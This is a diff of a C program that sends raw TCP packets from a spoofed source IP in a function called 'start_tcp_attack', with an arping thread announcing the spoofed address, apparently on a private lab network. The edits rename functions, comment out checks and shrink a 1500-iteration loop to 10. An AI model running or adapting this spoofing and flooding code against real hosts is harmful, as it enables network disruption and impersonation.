@@ -15,11 +15,11 @@
 
 void hostname_toip(char *dst, struct in_addr *dst_ip);
 char* get_local_ip();
-void start_attack(char *argv[]);
+void start_tcp_attack(char *argv[]);
 void send_arp(char *argv[]);
 void prepare_arping(char *argv[]);
 
-int main(int argc, char *argv[])
+int tcp_gen(int argc, char *argv[])
 {
 
     /*---------------------------------------
@@ -30,11 +30,11 @@ int main(int argc, char *argv[])
     ideally use setuid() function or something
     like that
     ---------------------------------------*/
-    if(argc < 4)
-    {
-        fprintf(stderr, "Usage: ./raw <Hostname> <Query string> <NIC [eth0, wlan0]>\n");
-        return 1;
-    }
+    //if(argc < 4)
+    //{
+    //    fprintf(stderr, "Usage: ./raw <Hostname> <Query string> <NIC [eth0, wlan0]>\n");
+    //    return 1;
+    //}
     struct timeval time;
     gettimeofday(&time, NULL);
     //srand(t1.tv_usec * t1.tv_sec);
@@ -43,14 +43,15 @@ int main(int argc, char *argv[])
 
     //srand(time(0));
 
-    char *ip_array[10];
+    char *ip_array[5];
 
-    ip_array[0] = argv[0];
-    ip_array[1] = argv[1];
-    ip_array[2] = argv[2];
-    ip_array[3] = argv[3];
+    ip_array[0] = argv[0];//prog. name
+    ip_array[1] = argv[1];//hostname
+    ip_array[2] = argv[2];//URI
+    ip_array[3] = argv[3];//dev
     ip_array[4] = "192.168.56.150";
 
+    //printf("\nTCP GEN fot args:\n%s\n%s\n%s\n%s\n", ip_array[0], ip_array[1], ip_array[2], ip_array[3]);
 
     pthread_t thread1;
 
@@ -61,21 +62,24 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    char *args[] = {"-q", "-A", "-I", argv[3], "-s", ip_array[4], "192.168.56.101"};
+    //char *args[] = {"-q", "-A", "-I", ip_array[3], "-s", ip_array[4], "192.168.56.102"};
+    char *args[] = {ip_array[3], ip_array[4]};
+    
     pthread_t arping_th;
 
     if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
     {
         fprintf(stderr, "Failed to create a thread for arping.\n");
-        exit(-1);
+        return -1;
     }
     pthread_detach(arping_th);
 
-    for(int i = 0; i < 1500; i++)
+    sleep(1);
+    for(int i = 0; i < 10; i++)
     {
         //sleep(1);
-        start_attack(ip_array);
-        printf("Thread %d started.\n", i);
+        start_tcp_attack(ip_array);
+        printf("Connection #%d started.\n", i);
 
         fflush(stdout);
     }
@@ -86,7 +90,7 @@ int main(int argc, char *argv[])
     return 0;
 }
 
-void start_attack(char *argv[])
+void start_tcp_attack(char *argv[])
 {
     int sock_raw;
 
@@ -94,12 +98,6 @@ void start_attack(char *argv[])
 
     char source_ip[25] = "";
     strcpy(source_ip, argv[4]);
-    //printf("-------------------\n");
-    //printf("Victim: %s\n", argv[1]);
-    //printf("Target of attack: %s\n", argv[2]);
-    //printf("Device: %s\n", argv[3]);
-    //printf("Source ip: %s\n", source_ip);
-    //printf("-------------------\n");
 
     //For every time rand func is called, be sure to generate different result
     //using rand()/srand() in multithreaded app is unsafe
@@ -115,16 +113,17 @@ void start_attack(char *argv[])
     if(sock_raw < 0)
     {
         perror("Socket error\n");
+        //printf("Either run this program as root, or grant CAP_NET_RAW to %s\n", argv[0]);
         exit(-1);
     }
-    else
-    {
-        printf("Socket %d created.\n", sock_raw);
-    }
+    //else
+    //{
+    //    printf("Socket %d created.\n", sock_raw);
+    //}
 
     char *dst;
     dst = argv[1];
-    //printf("Got argv[1]: %s\n", argv[1]);
+    //printf("\nStart tcp attack got argv[1] as dst address: %s\n", argv[1]);
 
     //If hostname (argv[1]) is specified in numbers-and-dots notation, convert to network byte order
     if(inet_addr(dst) != INADDR_NONE)
@@ -260,10 +259,21 @@ void hostname_toip(char *dst, struct in_addr *dst_ip)
 
 void prepare_arping(char *argv[])
 {
-    sleep(2);
-    int arg_count = 7;
+    //{"-q", "-A", "-I", ip_array[3], "-s", ip_array[4], "192.168.56.102"};
+    //int args_count = 3;
+    ////char *params[args_count];
+    ////
+    //for(int i = 0; i < args_count; i++)
+    //{
+    ////    params[i] = argv[i];
+    //    printf("arping: %s\n", argv[i]);
+    //}
+
+    //execl("/bin/sh", "sh", "-c", command, (char *) 0);))
+    //system("/usr/bin/arping -q -A -I vboxnet0 -s 192.168.56.150 192.168.56.102");
+    execl("arping", "-q -A -I", argv[0], "-s", argv[1], "192.168.56.102", (char *) NULL);
     //these parameters have to be specified exactly in this order with -q in front
-    arping_main(arg_count, argv);
+    //arping_main(args_count, params);
 }
 
 /*char* get_local_ip()
